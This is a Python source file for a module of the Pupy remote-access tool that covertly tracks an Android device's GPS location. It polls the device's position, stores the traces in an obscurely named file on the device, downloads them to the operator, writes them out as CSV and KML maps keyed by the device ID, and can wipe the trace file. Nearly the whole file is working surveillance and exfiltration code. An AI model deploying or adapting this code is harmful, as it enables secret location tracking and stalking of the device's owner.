# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

__class_name__="gpstracker"

from pupylib.PupyModule import *
from time import sleep
import os, datetime, csv
from rpyc.utils.classic import download
from pupylib.utils.common import getLocalAndroidPath

KML_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
    <Document>
        <name>MY_DOCUMENT</name>
        <description>MY_DESCRIPTION</description>
        <Style id="Lump">
            <LineStyle>
                <color>CD0000FF</color>
                <width>2</width>
            </LineStyle>
            <PolyStyle>
                <color>9AFF0000</color>
            </PolyStyle>
        </Style>
        <Style id="Path">
            <LineStyle>
                <color>FF0000FF</color>
                <width>3</width>
            </LineStyle>
        </Style>
        <Style id="markerstyle">
            <IconStyle>
                <Icon>
                    <href>http://maps.google.com/intl/en_us/mapfiles/ms/micons/red-dot.png</href>
                </Icon>
            </IconStyle>
        </Style>
        MY_PLACEMARKS
    </Document>
</kml>
"""

KML_PLACEMARK = """<Placemark>
            <name>MY_NAME</name>
            <description>MY_DESCRIPTION</description>
            <styleUrl>#Path</styleUrl>
            <LineString>
                <tessellate>1</tessellate>
                <altitudeMode>clampToGround</altitudeMode>
                <coordinates> 
                MY_COORDINATE_1
                MY_COORDINATE_2
                </coordinates>
            </LineString>
        </Placemark>
"""

def generateKML(deviceName, traces, outputFile):
    '''
    '''
    kmlPlacemarks, lastPlace = "", None
    kmlData = KML_TEMPLATE.replace('MY_DOCUMENT', deviceName)
    kmlData = kmlData.replace('MY_DESCRIPTION', deviceName)
    for aPlace in traces:
        if lastPlace == None:
            lastPlace = aPlace
        logging.info("{0},{1} --> {2},{3}".format(lastPlace[1],lastPlace[2], aPlace[1], aPlace[2]))
        aKmlPlacemark = KML_PLACEMARK.replace("MY_NAME", lastPlace[0])
        aKmlPlacemark = aKmlPlacemark.replace("MY_DESCRIPTION", "{0},{1}".format(lastPlace[1], lastPlace[2]))
        aKmlPlacemark = aKmlPlacemark.replace("MY_COORDINATE_1", "{0},{1},0.0".format(lastPlace[2],lastPlace[1]))
        aKmlPlacemark = aKmlPlacemark.replace("MY_COORDINATE_2", "{0},{1},0.0".format(aPlace[2], aPlace[1]))
        kmlPlacemarks += aKmlPlacemark+"\n"
        lastPlace = aPlace
    kmlData = kmlData.replace("MY_PLACEMARKS", "\n"+kmlPlacemarks)
    f = open(outputFile, 'w')
    f.write(kmlData)
    f.close()
        
@config(cat="gather", compat=["android"])
class gpstracker(PupyModule):
    """ to interact with gps """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='gpstracker', description=self.__doc__)
        self.arg_parser.add_argument('--start', action='store_true', help='start')
        self.arg_parser.add_argument('--stop', action='store_true', help='stop')
        self.arg_parser.add_argument('--status', action='store_true', help='status')
        self.arg_parser.add_argument('--dump', action='store_true', help='dump')
        self.arg_parser.add_argument('--clean', action='store_true', help='delete trace file stored on device')
        self.arg_parser.add_argument('-m', '--in-memory', action='store_true', help='traces stored in memory on the device (and not in file)')
        self.arg_parser.add_argument('-g', '--get-position', action='store_true', help='get current position')
        self.arg_parser.add_argument('-e', '--is-GPS-enabled', action='store_true', help='is GPS enabled?')
        self.arg_parser.add_argument('-n', '--is-network-rovider-enabled', action='store_true', help='is Network Provider enabled?')
        self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will store targtet's postions (default: %(default)s)")
        self.arg_parser.add_argument("-p", '--period', type=int, default=15, help="delay between each gps position (default: %(default)s)")

    def run(self, args):
        self.client.load_package("pupydroid.gpsTracker")
        self.client.load_package("pupydroid.utils")
        androidID = self.client.conn.modules['pupydroid.utils'].getAndroidID()
        self.localFolder = getLocalAndroidPath(localFolder=args.localOutputFolder, androidID=androidID, userName=self.client.desc['user'])
        gpsTracker = self.client.conn.modules['pupydroid.gpsTracker'].GpsTracker(period=args.period, inMemory=args.in_memory)
        if args.is_GPS_enabled == True:
            self.success("Is GPS enabled?")
            print gpsTracker.isGPSenabled()
        if args.is_network_rovider_enabled == True:
            self.success("Is Network Provider enabled?")
            print gpsTracker.isNetworkProviderEnabled()
        if args.get_position == True:
            if gpsTracker.isNetworkProviderEnabled() == False and gpsTracker.isGPSenabled()==False:
                self.error("GPS or Network Provider is not enabled on the device. You should not be able to get location!")
                return
            else:
                self.success("GPS or Network Provider is enabled on the device. You should be able to get location!")
            lat, lon = None, None
            gpsTracker.enable()
            for nbRetry in range(3):
                self.success("Getting current location...")
                lat, lon = gpsTracker.getCurrentLocation()
                if lat==None and lon==None:
                    self.error("Impossible to get location, retrying...")
                    sleep(5)
                else:
                    self.success("Current location:")
                    print "latitude: {0} , longitude: {1}".format(lat, lon)
                    break
            gpsTracker.disable()
        if args.start:
            r = self.client.conn.modules["pupydroid.gpsTracker"].startGpsTracker(period=args.period)
            if r == True:
                self.success("Tracking enabled. Get GPS position each {0} secds".format(args.period))
            else:
                self.error("Tracking not enabled because already activated")
        elif args.stop:
             self.success("Stopping GPS tracking... (can take {0} secds)".format(args.period))
             r = self.client.conn.modules["pupydroid.gpsTracker"].stopGpsTracker()
             if r == True:
                self.success("Tracking stopped")
             else:
                self.error("Tracking not stopped because not activated")
        elif args.dump:
            filename = os.path.join(self.localFolder,"gpsTraces.csv")
            if args.in_memory==False:
                traces = []
                download(self.client.conn, "keflfjezomef.csv",filename)
                self.success("GPS positions downloaded in {0}".format(filename))
                f = csv.DictReader(open(filename))
                for row in f:
                    traces.append([row['date'].replace(' ',''),row['latitude'].replace(' ',''),row['longitude'].replace(' ','')])
            else:
                traces = self.client.conn.modules["pupydroid.gpsTracker"].dumpGpsTracker()
            self.success("{0} GPS positions".format(len(traces)))
            if len(traces)>0:
                if args.in_memory==True:
                    f=open(filename,'w')
                    f.write("Date, Lat, Lon\n")
                    for aPos in traces:
                        f.write("{0}, {1}, {2}\n".format(aPos[0], aPos[1], aPos[2]))
                    f.close()
                    self.success("GPS positions (.csv) saved in {0}".format(filename))
                kmlFilename = os.path.join(self.localFolder,"gpsTraces.kml")
                generateKML(androidID, traces, outputFile=kmlFilename)
                self.success("KML file created in {0}".format(kmlFilename))
            else:
                self.error("No GPS positions get. You should start GPS tracking or wait a moment")
        elif args.status:
            if self.client.conn.modules["pupydroid.gpsTracker"].statusGpsTracker() == True:
                self.success("GPS tracking is enabled")
            else:
                self.success("GPS tracking is NOT enabled")
        elif args.clean:
            status = self.client.conn.modules["pupydroid.gpsTracker"].deleteFile()
            if status == True:
                self.success("Trace file deleted from device")
            else:
                self.error("Impossible to delete trace file on device")
                self.error("Gps Tracking has never been enabled or it is running")
